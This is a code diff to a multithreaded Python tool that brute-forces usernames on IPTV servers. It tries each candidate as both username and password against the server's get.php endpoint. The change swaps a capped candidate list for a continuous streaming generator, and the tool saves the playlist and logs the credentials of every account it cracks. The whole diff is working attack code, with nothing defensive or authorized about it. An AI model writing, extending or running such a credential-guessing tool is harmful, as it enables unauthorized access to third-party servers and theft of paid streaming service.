@@ -48,7 +48,7 @@ def log_event(message, to_console=False):
         logger.info(message)
 
 def generate_alphanumeric_generator(min_len=1, max_len=12):
-    """Generator for 1 to 12 character alphanumeric & special character combinations"""
+    """Continuous generator for 1 to 12 character alphanumeric & special character combinations"""
     chars = string.ascii_letters + string.digits + "!@#$%^&*()-_=+"
     for length in range(min_len, max_len + 1):
         for combo in itertools.product(chars, repeat=length):
@@ -200,74 +200,141 @@ def start_scan():
             scan_state["status_message"] = f"Attacking {server} ({threads_count} threads)..."
             log_event(msg_start, to_console=True)
 
-            word_list = []
+            found = 0
+            start_time = time.time()
+
             if charset_mode == "alphanumeric":
-                log_event(f"Using Alphanumeric & Special Chars brute force (Up to {max_len} chars)...", to_console=True)
+                log_event(f"Using Alphanumeric & Special Chars streaming brute force (Up to {max_len} chars)...", to_console=True)
                 gen = generate_alphanumeric_generator(min_len=1, max_len=max_len)
-                word_list = [next(gen) for _ in range(50000)]
-                total_lines = len(word_list)
-            else:
+                total_estimated = 1000000
+                scan_state["total"] = total_estimated
+                processed_count = 0
+
+                batch_size = threads_count * 100
+                executor = ThreadPoolExecutor(max_workers=threads_count)
+
+                try:
+                    while not scan_state["cancel_requested"]:
+                        # Pull next chunk from continuous generator without limits
+                        batch = []
+                        for _ in range(batch_size):
+                            try:
+                                batch.append(next(gen))
+                            except StopIteration:
+                                break
+
+                        if not batch:
+                            break
+
+                        future_to_username = {executor.submit(check_username, server, uname, headers): uname for uname in batch}
+                        for future in as_completed(future_to_username):
+                            if scan_state["cancel_requested"]:
+                                break
+
+                            processed_count += 1
+                            scan_state["progress"] = processed_count
+                            elapsed = time.time() - start_time
+                            scan_state["elapsed_seconds"] = int(elapsed)
+                            if processed_count > 1:
+                                avg_time_per_item = elapsed / processed_count
+                                remaining_items = max(0, total_estimated - processed_count)
+                                scan_state["eta_seconds"] = int(avg_time_per_item * remaining_items)
+
+                            username = future_to_username[future]
+                            log_event(f"request for name: {username}", to_console=False)
+                            
+                            if processed_count % 100 == 0:
+                                logger.info(f"Streaming progress on {server}: {processed_count} combinations tried - Accounts found: {found}")
+
+                            try:
+                                result = future.result()
+                                if result:
+                                    found_uname, fetched_text = result
+                                    domain = server.replace("http://", "").replace("https://", "").strip("/")
+                                    new_path = os.path.join(crawler.outputDir, domain)
+                                    crawler.create_file(found_uname, new_path, fetched_text)
+                                    found += 1
+                                    scan_state["found_accounts"] += 1
+                                    
+                                    m3u_file_path = os.path.join(domain, f"tv_channels_{found_uname}.m3u").replace("\\", "/")
+                                    playlist_url = f"{server}/get.php?username={found_uname}&password={found_uname}&type=m3u&output=mpegts"
+                                    
+                                    account_data = {
+                                        "server": server,
+                                        "username": found_uname,
+                                        "password": found_uname,
+                                        "file_path": m3u_file_path,
+                                        "playlist_url": playlist_url
+                                    }
+                                    found_accounts_list.append(account_data)
+
+                                    msg_found = f"ACCOUNT FOUND !!! -> Username: '{found_uname}' | Password: '{found_uname}' | Server: '{server}' | Saved file: '{m3u_file_path}'"
+                                    log_event(msg_found, to_console=True)
+                            except Exception:
+                                pass
+                finally:
+                    executor.shutdown(wait=False)
+
+            else: # Dictionary mode
                 lang_file = os.path.join(crawler.languageDir, "en.txt")
                 if not os.path.exists(lang_file):
                     log_event("Error: English wordlist missing.", to_console=True)
                     continue
                 with open(lang_file, "r", encoding="utf-8", errors="ignore") as f:
                     word_list = [line.strip() for line in f if line.strip()]
-                total_lines = len(word_list)
-
-            scan_state["total"] = total_lines
-            found = 0
-            start_time = time.time()
-
-            with ThreadPoolExecutor(max_workers=threads_count) as executor:
-                future_to_username = {executor.submit(check_username, server, uname, headers): uname for uname in word_list}
                 
-                for idx, future in enumerate(as_completed(future_to_username), start=1):
-                    if scan_state["cancel_requested"]:
-                        log_event(f"Attack cancelled on {server}.", to_console=True)
-                        executor.shutdown(wait=False)
-                        break
+                total_lines = len(word_list)
+                scan_state["total"] = total_lines
 
-                    username = future_to_username[future]
-                    scan_state["progress"] = idx
-                    elapsed = time.time() - start_time
-                    scan_state["elapsed_seconds"] = int(elapsed)
-                    if idx > 1:
-                        avg_time_per_item = elapsed / idx
-                        remaining_items = total_lines - idx
-                        scan_state["eta_seconds"] = int(avg_time_per_item * remaining_items)
-
-                    log_event(f"request for name: {username}", to_console=False)
+                with ThreadPoolExecutor(max_workers=threads_count) as executor:
+                    future_to_username = {executor.submit(check_username, server, uname, headers): uname for uname in word_list}
                     
-                    if idx % 100 == 0 or idx == total_lines:
-                        logger.info(f"Parallel progress on {server}: {idx}/{total_lines} ({round((idx/total_lines)*100)}%) - Accounts found: {found} - ETA: {scan_state['eta_seconds']}s")
+                    for idx, future in enumerate(as_completed(future_to_username), start=1):
+                        if scan_state["cancel_requested"]:
+                            log_event(f"Attack cancelled on {server}.", to_console=True)
+                            executor.shutdown(wait=False)
+                            break
 
-                    try:
-                        result = future.result()
-                        if result:
-                            found_uname, fetched_text = result
-                            domain = server.replace("http://", "").replace("https://", "").strip("/")
-                            new_path = os.path.join(crawler.outputDir, domain)
-                            crawler.create_file(found_uname, new_path, fetched_text)
-                            found += 1
-                            scan_state["found_accounts"] += 1
-                            
-                            m3u_file_path = os.path.join(domain, f"tv_channels_{found_uname}.m3u").replace("\\", "/")
-                            playlist_url = f"{server}/get.php?username={found_uname}&password={found_uname}&type=m3u&output=mpegts"
-                            
-                            account_data = {
-                                "server": server,
-                                "username": found_uname,
-                                "password": found_uname,
-                                "file_path": m3u_file_path,
-                                "playlist_url": playlist_url
-                            }
-                            found_accounts_list.append(account_data)
+                        username = future_to_username[future]
+                        scan_state["progress"] = idx
+                        elapsed = time.time() - start_time
+                        scan_state["elapsed_seconds"] = int(elapsed)
+                        if idx > 1:
+                            avg_time_per_item = elapsed / idx
+                            remaining_items = total_lines - idx
+                            scan_state["eta_seconds"] = int(avg_time_per_item * remaining_items)
 
-                            msg_found = f"ACCOUNT FOUND !!! -> Username: '{found_uname}' | Password: '{found_uname}' | Server: '{server}' | Saved file: '{m3u_file_path}'"
-                            log_event(msg_found, to_console=True)
-                    except Exception:
-                        pass
+                        log_event(f"request for name: {username}", to_console=False)
+                        
+                        if idx % 100 == 0 or idx == total_lines:
+                            logger.info(f"Parallel progress on {server}: {idx}/{total_lines} ({round((idx/total_lines)*100)}%) - Accounts found: {found} - ETA: {scan_state['eta_seconds']}s")
+
+                        try:
+                            result = future.result()
+                            if result:
+                                found_uname, fetched_text = result
+                                domain = server.replace("http://", "").replace("https://", "").strip("/")
+                                new_path = os.path.join(crawler.outputDir, domain)
+                                crawler.create_file(found_uname, new_path, fetched_text)
+                                found += 1
+                                scan_state["found_accounts"] += 1
+                                
+                                m3u_file_path = os.path.join(domain, f"tv_channels_{found_uname}.m3u").replace("\\", "/")
+                                playlist_url = f"{server}/get.php?username={found_uname}&password={found_uname}&type=m3u&output=mpegts"
+                                
+                                account_data = {
+                                    "server": server,
+                                    "username": found_uname,
+                                    "password": found_uname,
+                                    "file_path": m3u_file_path,
+                                    "playlist_url": playlist_url
+                                }
+                                found_accounts_list.append(account_data)
+
+                                msg_found = f"ACCOUNT FOUND !!! -> Username: '{found_uname}' | Password: '{found_uname}' | Server: '{server}' | Saved file: '{m3u_file_path}'"
+                                log_event(msg_found, to_console=True)
+                        except Exception:
+                            pass
 
             if server in crawler.parsedUrls and not scan_state["cancel_requested"]:
                 crawler.parsedUrls.remove(server)
